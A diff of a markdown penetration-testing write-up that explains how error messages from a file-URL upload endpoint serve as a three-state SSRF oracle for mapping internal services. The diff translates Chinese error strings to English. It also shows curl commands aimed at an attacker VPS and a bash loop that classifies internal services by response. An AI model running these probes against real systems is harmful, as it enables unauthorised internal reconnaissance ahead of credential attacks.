@@ -117,8 +117,8 @@ A file upload endpoint accepts a `file_url` parameter; the backend fetches it us
 
 | Oracle State | What Actually Happens on the Backend | Application-Layer Error Code |
 |---|---|---|
-| **HTTP OK -- non-Excel content** | TCP connection succeeds, service returns HTTP response, openpyxl parsing fails | `讀取 excel 發生錯誤: File is not a zip file` <!-- "Error reading excel: File is not a zip file" --> |
-| **AUTH -- HTTP service exists with auth layer** | TCP connection succeeds, service returns 4xx (401/403), openpyxl cannot parse auth error page | `API 金鑰驗證過程發生錯誤` <!-- "Error during API key verification" --> |
+| **HTTP OK -- non-Excel content** | TCP connection succeeds, service returns HTTP response, openpyxl parsing fails | `Error reading excel: File is not a zip file` |
+| **AUTH -- HTTP service exists with auth layer** | TCP connection succeeds, service returns 4xx (401/403), openpyxl cannot parse auth error page | `Error during API key verification` |
 | **UNREACHABLE -- port not open or connection refused** | TCP connection fails (RST or timeout) | `Internal Server Error` / request timeout |
 
 > **Core value of three-state classification**: Compared to a two-state oracle that only distinguishes "reachable vs. unreachable," the **AUTH state** directly reveals that the service has an HTTP auth layer, helping determine whether to attempt default credentials or known bypasses.
@@ -142,7 +142,7 @@ API_KEY="HARDCODED_API_KEY"   # In this case a hardcoded key; adjust per target
 curl -s -X POST "$TARGET" \
   -H "x-api-key: $API_KEY" -H "Content-Type: application/json" \
   -d '{"file_url": "http://VPS_IP/ssrf_test"}'
-# Expected: 讀取 excel 發生錯誤: File is not a zip file  <!-- "Error reading excel: File is not a zip file" -->
+# Expected: Error reading excel: File is not a zip file
 
 # Baseline B: RFC-1918 high port not open (UNREACHABLE baseline)
 curl -s -X POST "$TARGET" \
@@ -187,7 +187,7 @@ for SVC in "${SERVICES[@]}"; do
 
   if echo "$RESP" | grep -q "zip file"; then
     echo "[HTTP OK ] $SVC -- service exists, HTTP reachable, no auth"
-  elif echo "$RESP" | grep -q "金鑰驗證"; then  # Matches Chinese "key verification" AUTH error
+  elif echo "$RESP" | grep -q "key verification"; then  # Matches the "key verification" AUTH error
     echo "[AUTH    ] $SVC -- service exists, has auth layer"
   else
     echo "[UNREACH ] $SVC -- unreachable or port not open"
